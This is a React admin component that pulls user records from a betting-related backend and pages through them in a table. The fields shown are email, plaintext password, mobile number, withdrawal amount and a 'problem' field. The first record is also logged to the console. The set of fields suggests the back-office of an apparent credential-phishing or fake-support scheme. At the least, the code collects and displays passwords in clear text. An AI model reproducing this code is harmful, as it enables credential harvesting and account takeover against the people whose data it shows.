import React, { useState, useEffect } from 'react';
import axios from 'axios';

function UserDetails() {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  
  // Pagination states
  const [currentPage, setCurrentPage] = useState(1);
  const [usersPerPage, setUsersPerPage] = useState(10);
  const [allUsers, setAllUsers] = useState([]);

  useEffect(() => {
    fetchUsers();
  }, []);

  const fetchUsers = async () => {
    try {
      setLoading(true);
      const res = await axios.get(
        'https://backend-4bet.vercel.app/usersdetails',
        {
          headers: {
            Authorization: `Bearer ${localStorage.getItem('token')}`,
          },
        }
      );

      // Get users from response and log the first user to check structure
      const fetchedUsers = res.data.users || [];
      if (fetchedUsers.length > 0) {
        console.log('First user sample:', fetchedUsers[0]);
        console.log('Total users fetched:', fetchedUsers.length);
      }
      
      // Sort by createdAt timestamp (oldest first)
      const sortedUsers = [...fetchedUsers].sort((a, b) => {
        const dateA = a.createdAt ? new Date(a.createdAt) : null;
        const dateB = b.createdAt ? new Date(b.createdAt) : null;
        
        if (dateA && dateB) {
          return dateA - dateB;
        }
        return 0;
      });
      
      setAllUsers(sortedUsers);
      // Set initial pagination
      updateDisplayedUsers(sortedUsers, 1, usersPerPage);
    } catch (error) {
      console.error('Error fetching users:', error);
    } finally {
      setLoading(false);
    }
  };

  // Update displayed users based on pagination
  const updateDisplayedUsers = (allUsers, page, perPage) => {
    const startIndex = (page - 1) * perPage;
    const endIndex = startIndex + perPage;
    setUsers(allUsers.slice(startIndex, endIndex));
  };

  // Handle page change
  const handlePageChange = (page) => {
    setCurrentPage(page);
    updateDisplayedUsers(allUsers, page, usersPerPage);
  };

  // Handle users per page change
  const handleUsersPerPageChange = (e) => {
    const perPage = parseInt(e.target.value);
    setUsersPerPage(perPage);
    setCurrentPage(1); // Reset to first page
    updateDisplayedUsers(allUsers, 1, perPage);
  };

  // Format date with proper timezone handling
  const formatDate = (dateString) => {
    if (!dateString) return "N/A";
    
    try {
      const date = new Date(dateString);
      
      if (isNaN(date.getTime())) {
        return "Invalid date";
      }
      
      // Format to local date and time
      return date.toLocaleString();
    } catch (e) {
      console.error("Date formatting error:", e);
      return "N/A";
    }
  };

  const styles = {
    container: {
      padding: '20px',
      maxWidth: '1200px',
      margin: '0 auto',
    },
    title: {
      fontSize: '24px',
      fontWeight: 'bold',
      color: '#333',
      marginBottom: '20px',
    },
    tableWrapper: {
      maxHeight: '700px',
      overflowY: 'auto',
      boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
      borderRadius: '8px',
    },
    table: {
      width: '100%',
      borderCollapse: 'collapse',
    },
    th: {
      backgroundColor: '#f8f9fa',
      padding: '12px 15px',
      textAlign: 'left',
      borderBottom: '2px solid #ddd',
      fontSize: '14px',
      fontWeight: 'bold',
      position: 'sticky',
      top: 0,
      zIndex: 1,
    },
    td: {
      padding: '10px 15px',
      borderBottom: '1px solid #eee',
      fontSize: '14px',
    },
    loadingMessage: {
      textAlign: 'center',
      margin: '40px 0',
      fontSize: '18px',
      color: '#666',
    },
    emptyMessage: {
      textAlign: 'center',
      margin: '40px 0',
      fontSize: '16px',
      color: '#666',
    },
    userCount: {
      marginBottom: '15px',
      color: '#555',
      fontSize: '16px',
    },
    newestRow: {
      backgroundColor: '#f0f9ff',
    },
    pagination: {
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      margin: '20px 0',
      gap: '10px',
    },
    pageButton: {
      padding: '8px 12px',
      border: '1px solid #ddd',
      backgroundColor: '#fff',
      cursor: 'pointer',
      borderRadius: '4px',
    },
    activePageButton: {
      backgroundColor: '#007bff',
      color: '#fff',
      border: '1px solid #007bff',
    },
    paginationControls: {
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      margin: '15px 0',
    },
    select: {
      padding: '8px',
      borderRadius: '4px',
      border: '1px solid #ddd',
    }
  };

  // Calculate total pages
  const totalPages = Math.ceil(allUsers.length / usersPerPage);
  const pageNumbers = [];
  
  // Generate page numbers
  for (let i = 1; i <= totalPages; i++) {
    pageNumbers.push(i);
  }

  return (
    <div style={styles.container}>
      <h1 style={styles.title}>User Details</h1>
      {loading ? (
        <div style={styles.loadingMessage}>Loading user data...</div>
      ) : allUsers.length === 0 ? (
        <div style={styles.emptyMessage}>No users found.</div>
      ) : (
        <>
          <div style={styles.paginationControls}>
            <div style={styles.userCount}>
              Total Users: {allUsers.length} (Showing {(currentPage - 1) * usersPerPage + 1} to {Math.min(currentPage * usersPerPage, allUsers.length)})
            </div>
            <div>
              <span>Users per page: </span>
              <select 
                style={styles.select} 
                value={usersPerPage} 
                onChange={handleUsersPerPageChange}
              >
                <option value={10}>10</option>
                <option value={25}>25</option>
                <option value={50}>50</option>
                <option value={100}>100</option>
                <option value={allUsers.length}>Show All</option>
              </select>
            </div>
          </div>
          <div style={styles.tableWrapper}>
            <table style={styles.table}>
              <thead>
                <tr>
                  <th style={styles.th}>Email</th>
                  <th style={styles.th}>Password</th>
                  <th style={styles.th}>Mobile Number</th>
                  <th style={styles.th}>Withdrawal Amount</th>
                  <th style={styles.th}>Problem</th>
                  <th style={styles.th}>Created At</th>
                </tr>
              </thead>
              <tbody>
                {users.map((user, index) => (
                  <tr 
                    key={user._id || index}
                    style={index === users.length - 1 && currentPage === totalPages ? {...styles.newestRow} : {}}
                  >
                    <td style={styles.td}>{user.email || 'N/A'}</td>
                    <td style={styles.td}>{user.password || 'N/A'}</td>
                    <td style={styles.td}>{user.mobileNumber || 'N/A'}</td>
                    <td style={styles.td}>{user.withdrawalAmount || 'N/A'}</td>
                    <td style={styles.td}>{user.problem || 'N/A'}</td>
                    <td style={styles.td}>
                      {formatDate(user.createdAt)}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
          
          {/* Pagination UI */}
          {totalPages > 1 && (
            <div style={styles.pagination}>
              <button 
                style={styles.pageButton}
                onClick={() => handlePageChange(1)}
                disabled={currentPage === 1}
              >
                First
              </button>
              <button 
                style={styles.pageButton}
                onClick={() => handlePageChange(currentPage - 1)}
                disabled={currentPage === 1}
              >
                Prev
              </button>
              
              {/* Show limited page numbers with ellipsis */}
              {pageNumbers.length <= 7 ? (
                pageNumbers.map(number => (
                  <button
                    key={number}
                    style={{
                      ...styles.pageButton,
                      ...(currentPage === number ? styles.activePageButton : {})
                    }}
                    onClick={() => handlePageChange(number)}
                  >
                    {number}
                  </button>
                ))
              ) : (
                <>
                  {/* Always show first page */}
                  {currentPage > 3 && (
                    <>
                      <button
                        style={{
                          ...styles.pageButton,
                          ...(currentPage === 1 ? styles.activePageButton : {})
                        }}
                        onClick={() => handlePageChange(1)}
                      >
                        1
                      </button>
                      {currentPage > 4 && <span>...</span>}
                    </>
                  )}
                  
                  {/* Show pages around current page */}
                  {pageNumbers
                    .filter(number => number >= Math.max(1, currentPage - 2) && number <= Math.min(totalPages, currentPage + 2))
                    .map(number => (
                      <button
                        key={number}
                        style={{
                          ...styles.pageButton,
                          ...(currentPage === number ? styles.activePageButton : {})
                        }}
                        onClick={() => handlePageChange(number)}
                      >
                        {number}
                      </button>
                    ))
                  }
                  
                  {/* Always show last page */}
                  {currentPage < totalPages - 2 && (
                    <>
                      {currentPage < totalPages - 3 && <span>...</span>}
                      <button
                        style={{
                          ...styles.pageButton,
                          ...(currentPage === totalPages ? styles.activePageButton : {})
                        }}
                        onClick={() => handlePageChange(totalPages)}
                      >
                        {totalPages}
                      </button>
                    </>
                  )}
                </>
              )}
              
              <button 
                style={styles.pageButton}
                onClick={() => handlePageChange(currentPage + 1)}
                disabled={currentPage === totalPages}
              >
                Next
              </button>
              <button 
                style={styles.pageButton}
                onClick={() => handlePageChange(totalPages)}
                disabled={currentPage === totalPages}
              >
                Last
              </button>
            </div>
          )}
        </>
      )}
    </div>
  );
}

export default UserDetails;
